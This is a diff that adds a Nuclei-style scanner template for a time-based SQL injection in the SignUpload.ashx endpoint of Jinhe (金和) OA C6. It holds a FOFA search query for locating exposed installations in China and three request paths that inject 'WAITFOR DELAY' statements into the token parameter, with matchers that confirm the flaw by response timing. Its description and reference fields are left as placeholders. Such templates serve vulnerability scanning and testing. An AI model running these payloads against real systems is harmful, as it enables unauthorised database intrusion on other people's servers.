@@ -1,0 +1,26 @@
+id: jinhe-C6-SignUpload-sqli
+
+info:
+  name: 金和OA-SignUpload-延时注入
+  author: CyberCG
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+  metadata:
+    fofa-query: (app="金和网络-金和OA" || body="JHSoft.Web.AddMenu" || body="/jc6/platform/") && country="CN"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.ask/SignUpload.ashx?token=1%3BWAITFOR+DELAY+%270%3A0%3A%203%27+--%20and%201=1_123_123&filename=1"
+      - "{{BaseURL}}/C6/Jhsoft.Web.ask/SignUpload.ashx?token=1%3BWAITFOR+DELAY+%270%3A0%3A%206%27+--%20and%201=1_123_123&filename=1"
+      - "{{BaseURL}}/C6/Jhsoft.Web.ask/SignUpload.ashx?token=1%3BWAITFOR+DELAY+%270%3A0%3A%209%27+--%20and%201=1_123_123&filename=1"
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
